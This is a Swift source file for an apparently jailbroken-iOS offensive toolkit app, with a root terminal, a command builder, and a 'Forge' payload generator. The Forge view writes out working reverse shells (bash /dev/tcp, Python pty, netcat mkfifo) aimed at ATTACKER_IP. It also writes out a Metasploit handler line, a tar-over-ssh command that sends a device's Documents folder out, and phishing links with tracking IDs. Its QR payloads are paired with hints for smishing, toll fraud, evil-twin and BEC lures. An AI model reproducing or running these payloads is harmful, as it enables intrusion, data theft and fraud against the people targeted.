import SwiftUI
import CoreImage

@MainActor
final class TerminalModel: ObservableObject {
    @Published var lines: [LogEntry] = []
    @Published var running = false

    private var partial = ""
    private var tried127: Set<String> = []

    init() {
        let s = RootdSession.shared
        s.onChunk = { [weak self] c in self?.stream(c) }
        s.onDone = { [weak self] e, c in self?.done(e, c) }
        s.onFail = { [weak self] m, c in self?.fallback(m, c) }
    }

    func append(_ text: String, _ level: LogEntry.Level = .info) {
        lines.append(LogEntry(level: level, text: text))
        if lines.count > 1600 { lines.removeFirst(lines.count - 1200) }
    }

    // streaming live: i chunk arrivano spezzati, la riga incompleta resta in partial
    func stream(_ chunk: String) {
        let joined = partial.isEmpty ? chunk : partial + chunk
        partial = ""
        let rest = stripANSI(joined)
        let pieces = rest.split(separator: "\n", omittingEmptySubsequences: false)
        let n = pieces.count
        for (i, p) in pieces.enumerated() {
            if i == n - 1 && !rest.hasSuffix("\n") {
                partial = String(p)
            } else {
                lines.append(LogEntry(level: .info, text: String(p)))
            }
        }
        if lines.count > 1600 { lines.removeFirst(lines.count - 1200) }
    }

    // le TUI (script/top/yersinia) sparano sequenze VT100 — pulite per il log view
    private func stripANSI(_ s: String) -> String {
        var r = s
        r = r.replacingOccurrences(of: "\u{1b}\\[[0-9;?]*[ -/]*[@-~]", with: "", options: .regularExpression)
        r = r.replacingOccurrences(of: "\u{1b}\\][^\u{07}\u{1b}]*(\u{07}|\u{1b}\\\\)", with: "", options: .regularExpression)
        r = r.replacingOccurrences(of: "\u{1b}[@-Z\\\\-_]", with: "", options: .regularExpression)
        r = r.replacingOccurrences(of: "\r", with: "")
        return r
    }

    private func done(_ exit: Int32, _ cmd: String) {
        if !partial.isEmpty {
            lines.append(LogEntry(level: .info, text: partial))
            partial = ""
        }
        append("exit \(exit)", exit == 0 ? .good : .warn)
        running = RootdSession.shared.busy
        // 127 = command not found nel PATH della sh root → auto-install una sola volta per head
        guard exit == 127 else { return }
        let head = cmd.split(separator: " ", omittingEmptySubsequences: true).map(String.init).first ?? ""
        guard !head.isEmpty, !tried127.contains(head) else { return }
        tried127.insert(head)
        append("'\(head)' non trovato dalla sh root — auto-install…", .warn)
        installTool(head, then: cmd)
    }

    private func fallback(_ msg: String, _ cmd: String) {
        append(msg, .bad)
        append("rootd giù — fallback exec singola…", .warn)
        DispatchQueue.global(qos: .utility).async {
            let r = RootShell.shared.runSync(cmd, timeout: 300)
            DispatchQueue.main.async {
                for l in r.stdout.split(separator: "\n", omittingEmptySubsequences: false).prefix(400) {
                    self.append(String(l))
                }
                if !r.stderr.isEmpty {
                    for l in r.stderr.split(separator: "\n", omittingEmptySubsequences: false).prefix(120) {
                        self.append(String(l), .warn)
                    }
                }
                self.append("exit \(r.exitCode)", r.exitCode == 0 ? .good : .warn)
                self.running = false
            }
        }
    }

    func run(_ raw: String) {
        let cmd = raw.trimmingCharacters(in: .whitespaces)
        guard !cmd.isEmpty else { return }
        running = true
        Haptics.tap()
        append("$ \(cmd)", .exec)
        // sessione rootd persistente: una sh root viva — streaming live, cwd/env persistenti,
        // l'input si accoda anche mentre un altro comando gira (semantica terminale reale)
        RootdSession.shared.send(cmd)
    }
}

struct ToolsTab: View {
    @StateObject private var tm = TerminalModel()
    @EnvironmentObject private var o: Orchestrator
    @State private var mode = 0

    var body: some View {
        NavigationStack {
            VStack(spacing: 0) {
                Picker("tool", selection: $mode) {
                    Text("Terminal").tag(0)
                    Text("Builder").tag(1)
                    Text("Forge").tag(2)
                    Text("NFC").tag(3)
                    Text("PineApple").tag(4)
                }
                .pickerStyle(.segmented)
                .padding(10)
                switch mode {
                case 0: TerminalView().environmentObject(tm)
                case 1: BuilderView().environmentObject(tm)
                case 2: ForgeView()
                case 4: PineAppleView().environmentObject(o)
                default: NFCAttackView()
                }
            }
            .background(Color.bg.ignoresSafeArea())
            .navigationTitle("Tools")
            .navigationBarTitleDisplayMode(.inline)
        }
        .preferredColorScheme(.dark)
    }
}

// MARK: - Terminal

struct TerminalView: View {
    @EnvironmentObject var tm: TerminalModel
    @ObservedObject private var sess = RootdSession.shared
    @ObservedObject private var sr = ShellRunner.shared
    @State private var input = ""
    @State private var contentBottomY: CGFloat = 0
    @State private var viewportBottomY: CGFloat = 0
    @State private var nearBottom = true
    @FocusState private var focused: Bool
    @State private var hist: [String] = []
    @State private var histIdx = -1

    private let quick: [(String, String)] = [
        ("whoami", "whoami"),
        ("uname", "uname -a"),
        ("jb", "ls /var/jb/usr/bin"),
        ("apps bin", "ls /var/jb/Applications"),
        ("procs", "ps"),
        ("disk", "df"),
        ("net", "ifconfig"),
        ("env", "env"),
        ("sudo?", "sudo whoami"),
        ("apt upd", "sudo apt-get update"),
        ("help", "help"),
    ]

    var body: some View {
        VStack(spacing: 0) {
            ScrollView(.horizontal, showsIndicators: false) {
                HStack(spacing: 8) {
                    ForEach(sr.availableTools, id: \.self) { t in
                        Chip(text: t, active: false) { input = "\(t) " ; focused = true }
                    }
                    ForEach(ToolRegistry.specs, id: \.name) { s in
                        let installed = ShellRunner.shared.resolve(s.name) != nil
                        Chip(text: installed ? s.name : "+ \(s.name)", active: false) {
                            if installed {
                                input = "\(s.name) "
                                focused = true
                            } else {
                                tm.runSmartText("install \(s.name)")
                            }
                        }
                    }
                    ForEach(quick, id: \.0) { q in
                        Chip(text: q.0, active: false) { tm.runSmartText(q.1) }
                    }
                }
                .padding(.horizontal, 10)
            }
            .padding(.vertical, 8)

            ScrollViewReader { proxy in
                ScrollView {
                    LazyVStack(alignment: .leading, spacing: 4) {
                        ForEach(tm.lines) { l in
                            Text(l.text)
                                .font(.system(size: 11, design: .monospaced))
                                .foregroundColor(l.level == .exec ? .redHat : (l.level == .good ? .ok : (l.level == .bad ? .bad : .white.opacity(0.85))))
                                .textSelection(.enabled)
                                .id(l.id)
                        }
                    }
                    .padding(12)
                    .background(
                        GeometryReader { g in
                            Color.clear.preference(key: ContentBottomKey.self,
                                                   value: g.frame(in: .global).maxY)
                        }
                    )
                }
                .background(
                    GeometryReader { g in
                        Color.clear.preference(key: ViewportBottomKey.self,
                                               value: g.frame(in: .global).maxY)
                    }
                )
                .background(Color(hex: 0x070709))
                .onPreferenceChange(ContentBottomKey.self) { bottom in
                    contentBottomY = bottom
                    nearBottom = viewportBottomY - bottom > -80
                }
                .onPreferenceChange(ViewportBottomKey.self) { vp in
                    viewportBottomY = vp
                    nearBottom = vp - contentBottomY > -80
                }
                .onChange(of: tm.lines.count) { _ in
                    // scroll guard: se l'utente è risalito a leggere, niente autoscroll
                    guard nearBottom else { return }
                    withAnimation { proxy.scrollTo(tm.lines.last?.id, anchor: .bottom) }
                }
            }

            HStack(spacing: 10) {
                HStack(spacing: 5) {
                    Circle()
                        .fill(sess.connected ? Color.ok : Color.bad)
                        .frame(width: 8, height: 8)
                    Text("rootd")
                        .font(.system(size: 11, weight: .heavy, design: .monospaced))
                        .foregroundColor(sess.connected ? .ok : .bad)
                }
                TextField(tm.running ? "in esecuzione…" : "comando…", text: $input)
                    .textFieldStyle(.plain)
                    .font(.system(size: 13, design: .monospaced))
                    .focused($focused)
                    .onSubmit {
                        let c = input.trimmingCharacters(in: .whitespaces)
                        if !c.isEmpty, hist.last != c { hist.append(c); if hist.count > 100 { hist.removeFirst() } }
                        histIdx = -1
                        tm.runSmartText(input)
                        input = ""
                    }
                Button {
                    let c = input.trimmingCharacters(in: .whitespaces)
                    if !c.isEmpty, hist.last != c { hist.append(c); if hist.count > 100 { hist.removeFirst() } }
                    histIdx = -1
                    tm.runSmartText(input)
                    input = ""
                } label: {
                    Image(systemName: "play.fill")
                        .font(.system(size: 13, weight: .bold))
                        .foregroundColor(tm.running ? .dim : .redHat)
                }
                Button {
                    guard !hist.isEmpty else { return }
                    histIdx = min(histIdx + 1, hist.count - 1)
                    input = hist[hist.count - 1 - histIdx]
                    focused = true
                } label: {
                    Image(systemName: "chevron.up").font(.system(size: 11, weight: .bold)).foregroundColor(.dim)
                }
                Button {
                    if histIdx > 0 {
                        histIdx -= 1
                        input = hist[hist.count - 1 - histIdx]
                    } else {
                        histIdx = -1
                        input = ""
                    }
                } label: {
                    Image(systemName: "chevron.down").font(.system(size: 11, weight: .bold)).foregroundColor(.dim)
                }
                Button {
                    tm.lines.removeAll()
                } label: {
                    Image(systemName: "trash")
                        .font(.system(size: 13)).foregroundColor(.dim)
                }
                Button {
                    UIApplication.shared.sendAction(#selector(UIResponder.resignFirstResponder), to: nil, from: nil, for: nil)
                } label: {
                    Image(systemName: "keyboard.chevron.compact.down")
                        .font(.system(size: 13)).foregroundColor(.dim)
                }
            }
            .padding(12)
            .background(Color.surface)
        }
        .onAppear {
            focused = true
            sess.warm()
            if tm.lines.isEmpty { tm.append("rhs build \(ToolRegistry.buildTag)", .info) }
        }
    }
}

extension TerminalModel {
    func runSmartText(_ raw: String) {
        let cmd = raw.trimmingCharacters(in: .whitespaces)
        guard !cmd.isEmpty else { return }
        let parts = cmd.split(separator: " ", omittingEmptySubsequences: true).map(String.init)
        guard let head = parts.first else { return }
        if head == "clear" { lines.removeAll(); return }
        if head == "exit" {
            RootdSession.shared.close()
            append("sessione rootd chiusa — al prossimo comando si riconnette", .warn)
            return
        }
        // tui <cmd> → PTY reale: rileva la variante di script (util-linux ha -c, BSD no)
        if head == "tui", parts.count > 1 {
            let inner = parts.dropFirst().joined(separator: " ").replacingOccurrences(of: "'", with: "")
            let sc = "/var/jb/usr/bin/script"
            guard FileManager.default.fileExists(atPath: sc) else {
                installTool("util-linux", then: "tui \(inner)")
                return
            }
            run("if \(sc) -c true /dev/null >/dev/null 2>&1; then \(sc) -q -c '\(inner)' /dev/null; else \(sc) -q /dev/null \(inner); fi")
            return
        }
        if head == "install", parts.count > 1 {
            installTool(parts[1])
            return
        }
        if head == "sudo" {
            guard parts.count > 1 else {
                append("uso: sudo <comando> — su rootd già sei root", .warn)
                return
            }
            run(parts.dropFirst().joined(separator: " "))
            return
        }
        // builtins finti solo per la diagnostica app: ls/cat/cd/whoami/… ora sono REALI
        // nella sh root persistente (cd persiste davvero tra i comandi)
        if ["help", "spawntest", "repo"].contains(head) {
            append("$ \(cmd)", .exec)
            let out = BuiltinExec.exec(parts) ?? []
            for l in out { append(l) }
            return
        }
        // TUTTO il resto → sh root reale. L'auto-install scatta solo sul 127 reale
        // della sh (command not found), niente pre-check fittizi sul PATH dell'app
        run(cmd)
    }

    func installTool(_ tool: String, then cmd: String? = nil) {
        // gli install usano connessioni rootd proprie: girano anche mentre la sessione è occupata
        running = true
        append("auto-install '\(tool)'…", .warn)
        ToolRegistry.install(tool) { l in
            DispatchQueue.main.async { self.append(l) }
        } done: { ok in
            DispatchQueue.main.async {
                self.running = false
                if ok {
                    self.append("'\(tool)' pronto ✓", .good)
                    if let cmd { self.run(cmd) }
                } else {
                    self.append("install fallita — Sileo aperto sul pacchetto", .bad)
                    Haptics.fail()
                }
            }
        }
    }
}

// MARK: - Builder (GUI command)

struct BuilderView: View {
    @EnvironmentObject var tm: TerminalModel
    @State private var selectedTool = "nmap"
    @State private var values: [String: String] = [:]
    @FocusState private var focus: String?

    private struct Template {
        let tool: String
        let fields: [(label: String, key: String, def: String)]
        let build: ([String: String]) -> String
    }

    private let templates: [Template] = [
        Template(tool: "nmap", fields: [("target", "target", "192.168.1.0/24"),
                                        ("ports", "ports", "1-1024"),
                                        ("flags", "flags", "-sV -T4")],
                 build: { v in "nmap \(v["flags"] ?? "") -p \(v["ports"] ?? "") \(v["target"] ?? "")" }),
        Template(tool: "tcpdump", fields: [("iface", "iface", "any"),
                                           ("filter", "filter", "port 80")],
                 build: { v in "tcpdump -i \(v["iface"] ?? "any") -n \(v["filter"] ?? "")" }),
        Template(tool: "curl", fields: [("url", "url", "http://target/"),
                                        ("method", "method", "GET")],
                 build: { v in "curl -s -X \(v["method"] ?? "GET") \(v["url"] ?? "")" }),
        Template(tool: "ping", fields: [("host", "host", "192.168.1.1"),
                                        ("count", "count", "3")],
                 build: { v in "ping -c \(v["count"] ?? "3") \(v["host"] ?? "")" }),
        Template(tool: "netcat", fields: [("host", "host", "10.0.0.2"),
                                          ("port", "port", "80")],
                 build: { v in "nc \(v["host"] ?? "") \(v["port"] ?? "")" }),
        Template(tool: "python3", fields: [("script", "script", "scapy"),
                                           ("args", "args", "")],
                 build: { v in v["script"] == "scapy" ? "python3 -c \"from scapy.all import *\" --help" : "python3 \(v["script"] ?? "") \(v["args"] ?? "")" }),
        Template(tool: "raw", fields: [("cmd", "cmd", "echo hello")],
                 build: { v in v["cmd"] ?? "" }),
    ]

    private var template: Template {
        templates.first { $0.tool == selectedTool } ?? templates[0]
    }

    private var command: String {
        var v = values
        for f in template.fields where (v[f.key] ?? "").isEmpty {
            v[f.key] = f.def
        }
        return template.build(v)
    }

    var body: some View {
        ScrollView {
            VStack(alignment: .leading, spacing: 14) {
                ScrollView(.horizontal, showsIndicators: false) {
                    HStack(spacing: 8) {
                        ForEach(templates, id: \.tool) { t in
                            let installed = t.tool == "raw" || t.tool == "ping" || ShellRunner.shared.resolve(t.tool) != nil
                            Chip(text: t.tool, active: selectedTool == t.tool) {
                                selectedTool = t.tool
                                values = [:]
                                Haptics.tap()
                            }
                            .opacity(installed ? 1 : 0.45)
                        }
                    }
                }

                ForEach(Array(template.fields.enumerated()), id: \.offset) { i, f in
                    VStack(alignment: .leading, spacing: 4) {
                        Text(f.label.uppercased()).font(.system(size: 10, weight: .bold)).foregroundColor(.dim)
                        TextField(f.def, text: Binding(
                            get: { values[f.key] ?? "" },
                            set: { values[f.key] = $0 }))
                            .textFieldStyle(.plain)
                            .font(.system(size: 13, design: .monospaced))
                            .padding(10)
                            .background(RoundedRectangle(cornerRadius: 10).fill(Color(hex: 0x070709)))
                            .overlay(RoundedRectangle(cornerRadius: 10).strokeBorder(Color.white.opacity(0.1), lineWidth: 1))
                            .focused($focus, equals: f.key)
                            .submitLabel(i == template.fields.count - 1 ? .done : .next)
                            .onSubmit {
                                focus = i == template.fields.count - 1 ? nil : template.fields[i + 1].key
                            }
                    }
                }

                Text("COMANDO GENERATO").font(.system(size: 10, weight: .bold)).foregroundColor(.dim)
                Text(command)
                    .font(.system(size: 12, design: .monospaced))
                    .padding(12).frame(maxWidth: .infinity, alignment: .leading)
                    .background(RoundedRectangle(cornerRadius: 12).fill(Color(hex: 0x070709)))
                    .overlay(RoundedRectangle(cornerRadius: 12).strokeBorder(Color.white.opacity(0.08), lineWidth: 1))
                    .foregroundColor(.ok)
                    .textSelection(.enabled)

                HStack(spacing: 10) {
                    Button {
                        tm.runSmartText(command)
                        Haptics.heavy()
                    } label: {
                        Label("RUN", systemImage: "play.fill")
                            .font(.system(size: 13, weight: .bold, design: .rounded))
                            .frame(maxWidth: .infinity).padding(.vertical, 12)
                    }
                    .background(RoundedRectangle(cornerRadius: 12).fill(Color.redHat))
                    .foregroundColor(.white)
                    .buttonStyle(ScaleButton())

                    Button {
                        UIPasteboard.general.string = command
                        Haptics.win()
                    } label: {
                        Label("COPY", systemImage: "doc.on.doc")
                            .font(.system(size: 13, weight: .bold, design: .rounded))
                            .frame(maxWidth: .infinity).padding(.vertical, 12)
                    }
                    .background(RoundedRectangle(cornerRadius: 12).fill(Color.surfaceHi))
                    .foregroundColor(.white)
                    .buttonStyle(ScaleButton())
                }

                Text("Il comando gira nel tab Terminal (output condiviso). I tool in opacità ridotta verranno auto-installati al primo RUN.")
                    .font(.caption).foregroundColor(.dim)
            }
            .padding(16)
        }
        .background(Color.bg.ignoresSafeArea())
    }
}

// MARK: - Forge

struct ForgeView: View {
    @FocusState private var focus: String?
    enum Kind: String, CaseIterable, Identifiable {
        case revBash = "Bash"
        case revPy = "Python"
        case revNC = "Netcat"
        case msf = "MSF Handler"
        case portal = "Evil Portal"
        case phish = "Phish URL"
        case sshExfil = "SSH Exfil"
        case webhook = "Webhook Catch"
        case qWifi = "QR·WiFi"
        case qTel = "QR·tel:"
        case qSms = "QR·SMS"
        case qMail = "QR·Mail"
        case qIntent = "QR·Intent"
        case qApp = "QR·iOS App"
        case qWa = "QR·WhatsApp"
        case qContact = "QR·vCard"
        var id: String { rawValue }

        var isQR: Bool {
            switch self {
            case .qWifi, .qTel, .qSms, .qMail, .qIntent, .qApp, .qWa, .qContact: return true
            default: return false
            }
        }
    }

    @State private var kind: Kind = .revBash
    @State private var host = ""
    @State private var port = "4444"
    @State private var path = "/login"
    @State private var qrVal = ""
    @State private var copied = false
    // sid STABILE nel payload (UUID nel body cambierebbe a ogni render: link copiato ≠ mostrato)
    @State private var trackSid = UUID().uuidString.prefix(8).description

    private var payload: String {
        let h = host.isEmpty ? "ATTACKER_IP" : host
        let p = Int(port) ?? 4444
        switch kind {
        case .revBash:
            return "bash -i >& /dev/tcp/\(h)/\(p) 0>&1"
        case .revPy:
            return "python3 -c \"import socket,os,pty;s=socket.socket();s.connect(('\(h)',\(p)));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')\""
        case .revNC:
            return "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc \(h) \(p) > /tmp/f"
        case .msf:
            return "msfconsole -q -x \"use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST \(h); set LPORT \(p); run\""
        case .portal:
            return "http://\(h):\(p)\(path.isEmpty ? "/login" : path)"
        case .phish:
            return "https://\(h)\(path.isEmpty ? "/session" : path)?src=qr&sid=\(trackSid)"
        case .sshExfil:
            return "tar czf - /var/mobile/Documents 2>/dev/null | ssh \(h) 'cat > /tmp/exfil-\(Int(Date().timeIntervalSince1970)).tar.gz'"
        case .webhook:
            return "python3 -m http.server \(p) --bind 0.0.0.0"
        case .qWifi:
            let v = qrVal.split(separator: ",", maxSplits: 1)
            let s = v.first.map(String.init) ?? "SSID"
            let pw = v.count > 1 ? String(v[1]) : "password"
            return "WIFI:T:WPA;S:\(s);P:\(pw);;"
        case .qTel:
            return "tel:\(qrVal.isEmpty ? "+391234567890" : qrVal)"
        case .qSms:
            let v = qrVal.split(separator: ",", maxSplits: 1)
            let n = v.first.map(String.init) ?? "+391234567890"
            let t = v.count > 1 ? String(v[1]).addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? "" : ""
            return "SMSTO:\(n):\(t)"
        case .qMail:
            let v = qrVal.split(separator: ",", maxSplits: 2)
            let a = v.first.map(String.init) ?? "victim@target.com"
            let s = v.count > 1 ? String(v[1]) : "URGENT"
            let b = v.count > 2 ? String(v[2]).addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? "" : ""
            return "mailto:\(a)?subject=\(s)&body=\(b)"
        case .qIntent:
            let u = qrVal.isEmpty ? "evil.host/apk" : qrVal
            return "intent://\(u)#Intent;scheme=https;package=com.android.chrome;end"
        case .qApp:
            let n = qrVal.isEmpty ? "shortcut-name" : qrVal
            return "shortcuts://run-shortcut?name=\(n)"
        case .qWa:
            let v = qrVal.split(separator: ",", maxSplits: 1)
            let n = v.first.map(String.init) ?? "+391234567890"
            let t = v.count > 1 ? String(v[1]).addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? "" : "ciao"
            return "https://wa.me/\(n.replacingOccurrences(of: "+", with: ""))?text=\(t)"
        case .qContact:
            let v = qrVal.split(separator: ",", maxSplits: 2)
            let n = v.first.map(String.init) ?? "IT Support"
            let t = v.count > 1 ? String(v[1]) : "+391234567890"
            let e = v.count > 2 ? String(v[2]) : "support@corp.com"
            return "MECARD:N:\(n);TEL:\(t);EMAIL:\(e);;"
        }
    }

    private var qrPlaceholder: String {
        switch kind {
        case .qWifi: return "SSID,password"
        case .qTel: return "+391234567890"
        case .qSms: return "numero,messaggio"
        case .qMail: return "indirizzo,oggetto,corpo"
        case .qIntent: return "evil.host/apk"
        case .qApp: return "nome-shortcut"
        case .qWa: return "numero,messaggio"
        case .qContact: return "Nome,Telefono,Email"
        default: return ""
        }
    }

    private var hint: String {
        switch kind {
        case .revBash, .revPy, .revNC:
            return "Listener: MSF Handler o nc -lvnp \(port) su \(host.isEmpty ? "host" : host)"
        case .msf: return "Esegui su host attacker. Payload adattato all'arch del target."
        case .portal: return "Servi la pagina con hostapd + dnsmasq; QR mostrato alla vittima."
        case .phish: return "Il sid traccia le aperture. Manda come QR o link."
        case .sshExfil: return "Richiede chiave ssh sul target."
        case .webhook: return "Server catch-all: exfil via GET query string nel log."
        case .qWifi: return "La camera di Android/iOS propone il join all'AP — evil twin/captive portal a portata di scan."
        case .qTel: return "Il dialer si apre precompilato (premium/toll fraud, social)."
        case .qSms: return "Android apre l'app SMS precompilata — smishing con numeri del catalogo."
        case .qMail: return "Mail precompilata — BEC lure / phishing dipartimenti."
        case .qIntent: return "Deep link Android: forza il flusso su pagina/APK controllata."
        case .qApp: return "iOS propone l'esecuzione dello Shortcut (richiede conferma utente)."
        case .qWa: return "wa.me apre WhatsApp con testo precompilato — catena social engineering."
        case .qContact: return "MECARD: aggiunge contatto fidato con numero attacker — BEC call-back."
        }
    }

    var body: some View {
        ScrollView {
            VStack(alignment: .leading, spacing: 14) {
                ScrollView(.horizontal, showsIndicators: false) {
                    HStack(spacing: 8) {
                        ForEach(Kind.allCases) { k in
                            Chip(text: k.rawValue, active: kind == k) { kind = k }
                        }
                    }
                }
                if kind.isQR {
                    forgeField(qrPlaceholder, $qrVal, key: "qr", last: true)
                } else {
                    HStack(spacing: 10) {
                        forgeField("attacker host/IP", $host, key: "host", next: "port")
                        forgeField("port", $port, w: 80, key: "port", next: kind == .portal || kind == .phish ? "path" : nil)
                    }
                }
                if kind == .portal || kind == .phish {
                    forgeField("path", $path, key: "path", last: true)
                }

                Text("PAYLOAD").font(.system(size: 10, weight: .bold)).foregroundColor(.dim)
                Text(payload)
                    .font(.system(size: 12, design: .monospaced))
                    .padding(12).frame(maxWidth: .infinity, alignment: .leading)
                    .background(RoundedRectangle(cornerRadius: 12).fill(Color(hex: 0x070709)))
                    .overlay(RoundedRectangle(cornerRadius: 12).strokeBorder(Color.white.opacity(0.08), lineWidth: 1))
                    .foregroundColor(.ok)
                    .textSelection(.enabled)

                HStack(spacing: 10) {
                    Button {
                        UIPasteboard.general.string = payload
                        Haptics.win()
                        copied = true
                        DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) { copied = false }
                    } label: {
                        Label(copied ? "COPIED" : "COPY", systemImage: copied ? "checkmark" : "doc.on.doc")
                            .font(.system(size: 13, weight: .bold, design: .rounded))
                            .frame(maxWidth: .infinity).padding(.vertical, 12)
                    }
                    .background(RoundedRectangle(cornerRadius: 12).fill(Color.redHat))
                    .foregroundColor(.white)
                    .buttonStyle(ScaleButton())

                    Button {
                        UIPasteboard.general.string = payload
                        if let img = QRCodec.image(payload), let png = img.pngData() {
                            let urls = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
                                .appendingPathComponent("forge_payload.png")
                            try? png.write(to: urls)
                            Haptics.tap()
                        }
                    } label: {
                        Label("QR→FILE", systemImage: "qrcode")
                            .font(.system(size: 13, weight: .bold, design: .rounded))
                            .frame(maxWidth: .infinity).padding(.vertical, 12)
                    }
                    .background(RoundedRectangle(cornerRadius: 12).fill(Color.surfaceHi))
                    .foregroundColor(.white)
                    .buttonStyle(ScaleButton())
                }

                if payload.count < 400, let img = QRCodec.image(payload) {
                    Text("QR PAYLOAD").font(.system(size: 10, weight: .bold)).foregroundColor(.dim)
                    Image(uiImage: img)
                        .interpolation(.none)
                        .resizable()
                        .scaledToFit()
                        .frame(width: 220, height: 220)
                        .padding(14).background(Color.white)
                        .cornerRadius(14)
                        .frame(maxWidth: .infinity)
                } else {
                    Text(payload.count >= 400
                         ? "QR PAYLOAD — payload \(payload.count) char: oltre il limite QR, usa QR→FILE"
                         : "QR PAYLOAD — generazione fallita (payload non valido)")
                        .font(.system(size: 11, weight: .bold))
                        .foregroundColor(payload.count >= 400 ? .dim : .bad)
                        .frame(maxWidth: .infinity)
                }

                Text(hint).font(.caption).foregroundColor(.dim)
            }
            .padding(16)
        }
        .background(Color.bg.ignoresSafeArea())
    }

    private func forgeField(_ ph: String, _ bind: Binding<String>, w: CGFloat? = nil,
                            key: String? = nil, next: String? = nil, last: Bool = false) -> some View {
        TextField(ph, text: bind)
            .textFieldStyle(.plain).font(.system(size: 13, design: .monospaced))
            .padding(10)
            .background(RoundedRectangle(cornerRadius: 10).fill(Color(hex: 0x070709)))
            .overlay(RoundedRectangle(cornerRadius: 10).strokeBorder(Color.white.opacity(0.1), lineWidth: 1))
            .frame(width: w)
            .modifier(ForgeFocus(focus: $focus, key: key, next: next, last: last))
    }
}

// FocusState per campo: submit = next field, ultimo = done + keyboard giù
struct ForgeFocus: ViewModifier {
    @FocusState.Binding var focus: String?
    let key: String?
    let next: String?
    let last: Bool

    func body(content: Content) -> some View {
        if let key {
            content
                .focused($focus, equals: key)
                .submitLabel(last ? .done : .next)
                .onSubmit { if last { focus = nil } else { focus = next } }
        } else {
            content
        }
    }
}

// scroll guard: offset del fondo contenuto vs viewport (globali, confrontabili)
struct ContentBottomKey: PreferenceKey {
    static var defaultValue: CGFloat = 0
    static func reduce(value: inout CGFloat, nextValue: () -> CGFloat) { value = nextValue() }
}
struct ViewportBottomKey: PreferenceKey {
    static var defaultValue: CGFloat = 0
    static func reduce(value: inout CGFloat, nextValue: () -> CGFloat) { value = nextValue() }
}

enum QRCodec {
    static let ctx = CIContext()

    static func image(_ s: String) -> UIImage? {
        let data = Data(s.utf8)
        guard let filter = CIFilter(name: "CIQRCodeGenerator") else { return nil }
        filter.setValue(data, forKey: "inputMessage")
        filter.setValue("H", forKey: "inputCorrectionLevel")
        guard let out = filter.outputImage else { return nil }
        let scaled = out.transformed(by: CGAffineTransform(scaleX: 12, y: 12))
        guard let cg = ctx.createCGImage(scaled, from: scaled.extent) else { return nil }
        return UIImage(cgImage: cg)
    }
}
